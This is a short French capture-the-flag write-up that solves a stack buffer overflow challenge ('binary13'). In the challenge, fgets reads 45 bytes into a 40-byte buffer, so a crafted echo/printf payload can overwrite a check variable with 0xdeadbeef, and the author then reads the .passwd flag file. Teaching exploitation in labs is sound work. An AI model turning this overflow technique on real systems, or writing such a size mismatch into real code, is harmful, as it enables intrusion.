La faille se trouve ici :
```
char buf[40];
fgets(buf,45,stdin);
```

En augmentant progressivement la taille du string passé en stdin (ou bien en automatisant la tâche avec le module metasploit pattern_create) on se rend bien compte que après le 40ème caractère on commence à écrire dans la variable check.

En prenant en compte les inversions des octets (petit boutien) on prépare le payload :
```
echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$(printf '\xef\xbe\xad\xde') > /tmp/payload.txt
```
Enfin, on utilise cat pour injecter le payload et on rajoute le - pour garder la main sur le stdin :
```
cat /tmp/payload.txt - | ./binary13
[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
[check] 0xdeadbeef
Yeah dude ! You win !
cat .passwd
```
